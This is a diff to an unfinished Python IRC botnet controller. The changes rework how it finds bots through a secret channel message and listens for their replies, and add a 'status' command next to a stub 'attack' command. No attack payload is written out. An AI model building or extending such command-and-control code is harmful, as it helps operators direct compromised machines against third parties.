@@ -5,6 +5,7 @@ import socket
 import random
 import string
 import time
+from datetime import datetime, timedelta
 import threading
 import select
 
@@ -31,7 +32,7 @@ class PyBotCon:
     try: # NOTE: Should put this in some kind of loop so the bot can retry, generateRandomName() should be called from inside of the loop
       self.ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       self.ircsock.connect((host,int(port)))
-      self.ircsock.setblocking(0)
+#      self.ircsock.setblocking(0)
       self.ircsock.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
       self.ircsock.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
     except:
@@ -39,7 +40,7 @@ class PyBotCon:
 
 #    self.ircsock.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
     self.joinChan()
-    self.identifyBots()
+#    self.identifyBots() # This should not be run when conbot connects, as it waits for at least one bot
     self.conMain()
 #    self.listen()
 
@@ -57,14 +58,14 @@ class PyBotCon:
 
   def conMain(self):
     while(True):
-      data = ""
-      data = self.ircsock.recv(1024).decode("UTF-8")
-      data = data.strip("\n\r")
-      dataLen = len(data.split()) #Split on white space
-
-      if dataLen == 2 and data.split()[0] == "PING":
-        print("DEBUG --> data recieved: PING REQUEST")
-        self.ping()
+#      data = ""
+#      data = self.ircsock.recv(1024).decode("UTF-8")
+#      data = data.strip("\n\r")
+#      dataLen = len(data.split()) #Split on white space
+#
+#      if dataLen == 2 and data.split()[0] == "PING":
+#        print("DEBUG --> data recieved: PING REQUEST")
+#        self.ping()
 #      elif dataLen >= 4 and data.split()[1] == "PRIVMSG": 
 #        print("DEBUG --> PRIVMSG/data recieved: ")
 #        senderDetails = data.split()[0].split(":")[1]
@@ -76,7 +77,7 @@ class PyBotCon:
       print("command> ",end='')
       command = input()
       if(command == "status"):
-#        self.identifyBots()
+        self.identifyBots()
         print(str(len(self.botList))+" bots found: " + str(self.botList))
       elif(command.startswith("attack")):
         # NOTE --> Need to create a function for sending the attack command
@@ -127,11 +128,14 @@ class PyBotCon:
     # Send 'hello' message for bots to identify themselves
     self.ircsock.send(bytes("PRIVMSG " + self.channel + " " + self.secret + "\n","UTF-8")) 
     self.botList = [] # botList starts as an empty list: it is cleared and rebuilt every time this function is called
-    self.ircsock.setblocking(0)
-    time.sleep(10)
-    read, _, _ = select.select([self.ircsock],[],[],5)
-    while read[0]!= None:
+#    self.ircsock.setblocking(0)
+    time.sleep(5)
+    period = timedelta(seconds=5) 
+    endLoop = datetime.now() + period
+#    print("DEBUG --> readable socket list: " + str(read))
+    while datetime.now() < endLoop:
 # NOTE --> I'm not sure how I should be listening for bot replies, this will need to be adjusted
+      read, _, _ = select.select([self.ircsock],[],[],5)
       data = self.ircsock.recv(2048).decode("UTF-8")
       data = data.strip("\n\r")
       dataLen = len(data.split())
